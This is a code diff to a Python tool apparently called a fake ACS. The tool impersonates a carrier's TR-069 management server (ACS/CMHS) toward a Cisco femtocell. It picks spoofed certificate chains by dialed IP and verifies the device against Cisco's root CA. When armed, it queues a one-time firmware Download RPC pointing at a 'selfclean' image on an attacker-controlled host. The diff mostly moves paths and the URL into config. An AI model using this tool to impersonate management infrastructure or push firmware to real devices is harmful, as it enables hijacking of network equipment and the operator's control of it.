@@ -1,5 +1,13 @@
 import ssl, socket, datetime, threading, os, re
 
+# --- config: edit for your deployment ---------------------------------------
+_HERE = os.path.dirname(os.path.abspath(__file__))       # certs live next to this file
+SDP_URL  = "http://10.179.1.202:8080/rmm-selfclean.sdp"  # where the femto fetches the firmware
+SDP_SIZE = 3710                                          # bytes of rmm-selfclean.sdp (must match)
+# The CTX dict below is keyed by the destination IP the femto dialed (it sends no SNI);
+# those keys must be your ACS (.203) and CMHS (.202) addresses.
+# ----------------------------------------------------------------------------
+
 LOG="/var/log/acs_tr069.log"
 BODIES="/var/log/acs_bodies.log"
 
@@ -23,7 +31,7 @@ def make_ctx(chain, key):
     # MUTUAL TLS: femto expects the ACS to request its client (device) cert; we trust
     # its real PKI root (Cisco Root CA M1) so its device chain verifies and it proceeds.
     try:
-        c.load_verify_locations("/opt/fakeacs/cisco_clientca.pem")
+        c.load_verify_locations(os.path.join(_HERE,"cisco_clientca.pem"))
     except Exception as e:
         log(f"clientCA load failed: {e}")
     c.verify_mode=ssl.CERT_OPTIONAL
@@ -31,8 +39,8 @@ def make_ctx(chain, key):
 
 # Per-destination-IP contexts (femto sends NO SNI): pick the cert by the IP it dialed.
 CTX={
- "10.179.1.202": make_ctx("/opt/fakeacs/chain202.pem","/opt/fakeacs/leaf.key"),  # CMHS
- "10.179.1.203": make_ctx("/opt/fakeacs/chain203.pem","/opt/fakeacs/leaf.key"),  # ACS/femtocell
+ "10.179.1.202": make_ctx(os.path.join(_HERE,"chain202.pem"),os.path.join(_HERE,"leaf.key")),  # CMHS
+ "10.179.1.203": make_ctx(os.path.join(_HERE,"chain203.pem"),os.path.join(_HERE,"leaf.key")),  # ACS/femtocell
 }
 DEFAULT=CTX["10.179.1.202"]
 
@@ -255,9 +263,9 @@ def handle(raw, addr):
     # to confirm. Idempotent: enforced on every ACS session/boot.
     import os as _os
     _sc=[]
-    _selfclean_arm="/opt/fakeacs/.selfclean_arm"; _selfclean_sent="/opt/fakeacs/.selfclean_sent"
+    _selfclean_arm=_os.path.join(_HERE,".selfclean_arm"); _selfclean_sent=_os.path.join(_HERE,".selfclean_sent")
     if _os.path.exists(_selfclean_arm) and not _os.path.exists(_selfclean_sent):
-        _sc=[download("http://10.179.1.202:8080/rmm-selfclean.sdp", 3710, key="selfclean-v1")]
+        _sc=[download(SDP_URL, SDP_SIZE, key="selfclean-v1")]
         open(_selfclean_sent,"w").close()  # send at most once per arming
     rpc_queue=[
       *_sc,
